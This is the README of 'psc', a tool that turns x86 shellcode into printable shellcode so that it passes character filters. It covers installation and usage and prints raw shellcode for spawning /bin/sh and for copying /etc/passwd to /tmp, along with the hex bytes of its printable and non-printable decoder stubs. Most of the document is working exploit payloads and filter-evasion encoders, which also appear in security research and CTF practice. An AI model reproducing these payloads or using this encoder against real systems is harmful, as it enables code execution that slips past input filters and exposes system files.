# `psc`: Printable Shellcode Compiler

## Getting started
The entire tool resides in `psc.c`. To compile & install the tool, run -

```bash
make
sudo make install
```

The install command copies the psc (executable) and psc.7 (man page) to system directories prefixed at `/usr/local`.

To run without installing -

```bash
# access man page
man ./psc.7

# run the tool
./psc <some_shellcode>
```

## Basic commands

To get printable shellcode of an arbitrary shellcode ("\xcd\x80..") -

```bash
psc "\xcd\x80.."
```

To generate a C stub along with the printable shellcode -

```bash
# generate the C stub
psc -c "\xcd\x80.." >run.c

# compile the output & run it
gcc -m32 -z execstack -o run run.c
./run
```

Retrieve only the encoded payload from the printable shellcode -

```bash
psc -e "\xcd\x80.."
```

For an exhaustive list of options and examples, please refer to the man page of psc.

## Examples

Shellcode: Spawn /bin/sh

```bash
# generate C stub
./psc -c "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" >run.c

# compile & run the output
gcc -m32 -z execstack -o run run.c
./run
```

Shellcode: Copy `/etc/passwd` to `/tmp/outfile`

```bash
# generate C stub
./psc -c "\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80" >run.c

# compile & run the output
gcc -m32 -z execstack -o run run.c
./run

# verify
cat /tmp/outfile
```

## Our Decoder
To convert to printable representation, use -

```bash
echo -e "\x60\x50..."
```

__Non-Printable Decoder__
`\x60\x50\x59\x8d\x49\x43\x51\x5a\x80\x39\x26\x74\x35\x30\xc0\x30\xdb\x32\x01\x40\xc0\xe0\x04\x41\x32\x19\x43\xc0\xe3\x02\xc0\xeb\x04\x30\xd8\x88\x02\x42\x30\xc0\x30\xdb\x32\x01\x40\x41\x32\x19\x43\xc0\xe0\x06\xc0\xe3\x02\xc0\xeb\x02\x30\xd8\x88\x02\x42\x41\x75\xc6\x61`

__Printable Decoder__
`\x60\x50\x59\x6a\x30\x58\x34\x30\x48\x50\x5b\x6a\x30\x58\x30\x59\x35\x30\x41\x4f\x30\x59\x4f\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6a\x30\x59\x6a\x30\x41\x6b\x30\x59\x6d\x30\x59\x6e\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3d\x30\x59\x3e\x30\x59\x47\x51\x5a\x4f\x79\x49\x26\x74\x3c\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x49\x43\x3f\x2c\x34\x32\x41\x4a\x40\x24\x3C\x3f\x27\x32\x30\x27\x77\x42\x49\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x4a\x43\x32\x41\x4b\x40\x3f\x2c\x36\x24\x3f\x30\x27\x77\x42\x4a\x42\x42\x41\x41\x41\x75\x41\x61`

__Printable Decoder with test shim__
`\x60\x50\x59\x6a\x30\x58\x34\x30\x48\x50\x5b\x6a\x30\x58\x30\x59\x35\x30\x41\x4f\x30\x59\x4f\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6a\x30\x59\x6a\x30\x41\x6b\x30\x59\x6d\x30\x59\x6e\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3d\x30\x59\x3e\x30\x59\x47\x51\x5a\x4f\x79\x5b\x26\x74\x3c\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x5b\x43\x3f\x2c\x34\x32\x41\x5c\x40\x24\x3C\x3f\x27\x32\x30\x27\x77\x42\x5b\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x5c\x43\x32\x41\x5d\x40\x3f\x2c\x36\x24\x3f\x30\x27\x77\x42\x5c\x42\x42\x41\x41\x41\x75\x41\x61\x31\xc0\xb0\x14\xcd\x80\x50\x5b\x31\xc0\x31\xc9\xb0\x25\xb1\x0f\xcd\x80`
